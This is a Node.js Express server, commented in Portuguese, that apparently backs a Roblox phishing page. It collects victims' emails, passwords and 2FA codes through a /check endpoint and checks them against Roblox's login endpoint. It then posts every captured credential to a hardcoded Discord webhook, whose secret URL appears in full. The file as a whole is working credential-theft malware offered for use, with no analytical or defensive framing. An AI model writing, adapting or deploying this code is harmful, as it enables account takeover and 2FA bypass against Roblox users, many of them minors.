const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// SEU WEBHOOK DO DISCORD
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

app.use(express.json());
app.use(express.static('.'));

// Função para fazer login no Roblox
async function loginRoblox(email, password) {
    const loginUrl = "https://www.roblox.com/users/login";
    
    try {
        const response = await axios.post(loginUrl, {
            username: email,
            password: password
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.roblox.com/'
            },
            timeout: 10000,
            validateStatus: function (status) {
                return status >= 200 && status < 400;
            }
        });

        const data = response.data;

        if (data.id && typeof data.id === 'number') {
            return { success: true, data: data, error: null };
        } else {
            const errorMsg = data.error || data.message || "Resposta inválida (Sem ID)";
            return { success: false, data: data, error: errorMsg };
        }

    } catch (error) {
        let errorMsg = "Erro Desconhecido";
        if (error.response) {
            errorMsg = `Erro HTTP ${error.response.status}: ${JSON.stringify(error.response.data)}`;
        } else {
            errorMsg = error.message;
        }
        return { success: false, data: null, error: errorMsg };
    }
}

async function sendToDiscord(message) {
    try {
        await axios.post(WEBHOOK_URL, { content: message });
    } catch (e) { console.error(e); }
}

app.post('/check', async (req, res) => {
    const { email, password, code2fa, isFinalStep } = req.body;

    if (isFinalStep) {
        const discordMessage = `**🔒 LOGIN COMPLETO (2FA)**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Code 2FA:** ${code2fa}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);
        return res.json({ success: true });
    }

    if (!email || !password) {
        return res.json({ success: false, error: "Falta o Email ou a Senha" });
    }

    const result = await loginRoblox(email, password);

    if (result.success) {
        const username = result.data.username || "Unknown";
        const userId = result.data.id || "Unknown";
        
        const discordMessage = `**🔒 CONTA ENCONTRADA!**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Username:** ${username}\n` +
                               `**User ID:** ${userId}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);

        return res.json({
            success: true,
            username: username,
            userId: userId,
            error: ""
        });
    } else {
        const errorMsg = result.error || "Conta ou Senha Incorretas";
        
        const discordMessage = `**❌ LOGIN FALHOU**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Erro:** ${errorMsg}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);

        return res.json({
            success: false,
            username: "Unknown",
            userId: "Unknown",
            error: errorMsg
        });
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
